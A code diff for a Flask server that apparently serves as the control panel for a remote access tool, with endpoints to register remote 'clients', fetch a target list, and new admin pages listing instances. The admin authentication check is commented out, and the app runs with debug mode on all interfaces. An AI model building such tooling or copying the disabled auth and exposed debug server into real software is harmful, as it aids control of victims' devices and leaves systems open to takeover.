@@ -7,7 +7,9 @@ ones for the client start with "Client"
 import os
 from flask import Flask
 from flask import request
+from flask import redirect
 from flask import make_response
+from flask import render_template
 from functools import wraps
 from flask_restful import Api
 from flask_restful import Resource
@@ -17,10 +19,16 @@ load_dotenv()
 
 import rat_api
 import database
+import client_api
 
-app = Flask(__name__)
+app = Flask(__name__, static_folder="static")
 api = Api(app)
 db = database.Database()
+
+@app.after_request
+def add_header(response):
+    response.headers['Cache-Control'] = 'no-store'
+    return response
 
 def rat_authentication(f):
     """ Authentication for the remote device """
@@ -29,6 +37,15 @@ def rat_authentication(f):
         token = request.cookies.get('client_id')
         if not db.is_document(token):
             return make_response("Unauthorized", 401)
+        return f(*args, **kwargs)
+    return decorated_function
+
+def admin_auth(f):
+    """ Authentication required for admin """
+    @wraps(f)
+    def decorated_function(*args, **kwargs):
+        # if not True:
+            # return redirect('/login')
         return f(*args, **kwargs)
     return decorated_function
 
@@ -64,10 +81,38 @@ class RATTargetList(Resource):
         return response
 
 
+class HomePage(Resource):
+    @staticmethod
+    @admin_auth
+    def get():
+        """ User can decide which instance to view"""
+        instances, status_code = client_api.get_instances()
+        response = make_response(render_template("index.html", mappings=instances))
+        response.status_code = status_code
+        return response
 
+
+class InstancePage(Resource):
+    @staticmethod
+    @admin_auth
+    def get(instance: str):
+        """ Get the page for a specific instance """
+        data, status_code = client_api.get_instance_page_data(instance)
+        if status_code == 200:
+            response = make_response(render_template("instance.html", data=data))
+        else:
+            response = make_response(data['error'])
+        response.status_code = status_code
+
+        return response
+
+
+
+api.add_resource(HomePage, "/")
+api.add_resource(InstancePage, "/i/<instance>/", "/i/<instance>")
 api.add_resource(RATRegisterClient, "/api/v0/rat/register")
 api.add_resource(RATTargetList, "/api/v0/rat/targetlist")
 
 if __name__ == "__main__":
-    app.run(debug=True)
+    app.run(host="0.0.0.0", debug=True)
 
